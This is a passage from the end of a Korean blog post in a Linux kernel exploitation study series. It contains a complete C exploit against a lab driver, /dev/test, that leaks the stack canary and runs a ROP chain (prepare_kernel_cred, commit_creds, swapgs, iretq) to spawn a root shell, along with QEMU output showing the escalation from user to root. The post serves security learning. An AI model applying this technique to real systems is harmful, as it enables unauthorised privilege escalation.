user_rflags;<br>    uint64_t user_rsp;<br>    uint64_t user_ss;<br>&#125; __attribute__((packed));<br><br>struct register_val rv;<br><br>void backup_rv(void) &#123;<br>    asm(&quot;mov rv+8, cs;&quot;<br>        &quot;pushf; pop rv+16;&quot;<br>        &quot;mov rv+24, rsp;&quot;<br>        &quot;mov rv+32, ss;&quot;<br>       );<br>&#125;<br><br>void shell() &#123;<br>    execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL);<br>&#125;<br><br>int main() &#123;<br>    int fd;<br>    size_t payload[20] = &#123;0, &#125;;<br>    size_t *canary[2] = &#123;0, &#125;;<br>    int i = 0;<br>    <br>    void *commit_creds = 0xffffffff8108e9f0;<br>    void *prepare_kernel_cred = 0xffffffff8108ec20;<br><br>    fd = open(&quot;/dev/test&quot;, O_RDWR);<br><br>    read(fd, canary, sizeof(canary));<br>    printf(&quot;canary = %lx\n&quot;, canary[1]);<br><br>    backup_rv();<br><br>    payload[i++] = canary[1];<br>    payload[i++] = canary[1];<br>    payload[i++] = canary[1];<br>    payload[i++] = canary[1];<br>    payload[i++] = canary[1];<br>    payload[i++] = 0xffffffff813fb9bc;    // pop rdi; ret;<br>    payload[i++] = 0;<br>    payload[i++] = prepare_kernel_cred;<br>    payload[i++] = 0xffffffff813f4eca;    // pop rcx; ret;<br>    payload[i++] = 0;<br>    payload[i++] = 0xffffffff81b2413b;    // mov rdi, rax; rep movs ...; ret;<br>    payload[i++] = commit_creds;<br>    payload[i++] = 0xffffffff81c00f58;    // swapgs; ret;<br>    payload[i++] = 0xffffffff810252b2;    // iretq; ret;<br>    payload[i++] = &amp;shell;<br>    payload[i++] = rv.user_cs;<br>    payload[i++] = rv.user_rflags;<br>    payload[i++] = rv.user_rsp;<br>    payload[i++] = rv.user_ss;<br><br>    write(fd, payload, sizeof(payload));<br><br>    close(fd);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure>

</br>

<h3 id="공격결과"><a href="#공격결과" class="headerlink" title="공격결과"></a>공격결과</h3><pre><code>qemu-system-x86_64: warning: TCG doesn&#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5]
/ $ whoami
user
/ $ ./exploit 
canary = c6fd32469a343500
/ # whoami
root
/ # 
</code></pre>
<p></br></br></p>
<h2 id="참고"><a href="#참고" class="headerlink" title="참고"></a>참고</h2><pre><code>b30w0lf님의 운영체제(Operating System)
DREAMHACK - Linux Kernel Exploit
INFLEARN - 리눅스 커널 해킹. A부터 Z까지
https://www.lazenca.net/pages/viewpage.action?pageId=25624859
https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame
</code></pre>
<p></br></br></p>
<h2 id="한줄평"><a href="#한줄평" class="headerlink" title="한줄평"></a>한줄평</h2><pre><code>🗡️ ❌ 🛡️
</code></pre>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/Research/">Research</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/exploit/">exploit</a>
                    
                      <a class="hover-with-bg" href="/tags/linux/">linux</a>
                    
                      <a class="hover-with-bg" href="/tags/kernel/">kernel</a>
                    
                      <a class="hover-with-bg" href="/tags/mitigation/">mitigation</a>
                    
                      <a class="hover-with-bg" href="/tags/smep/">smep</a>
                    
                      <a class="hover-with-bg" href="/tags/smap/">smap</a>
                    
                      <a class="hover-with-bg" href="/tags/ssp/">ssp</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/10/04/linux-kernel-exploit-kpti/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">[Research] Linux Kernel Exploit - KPTI</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/10/02/linux-kernel-exploit-bypassing-smap/">
                        <span class="hidden-mobile">[Research] Linux Kernel Exploit - Bypassing SMAP</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  

  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>



  <script  src="/js/local-search.js" ></script>






  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>















<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
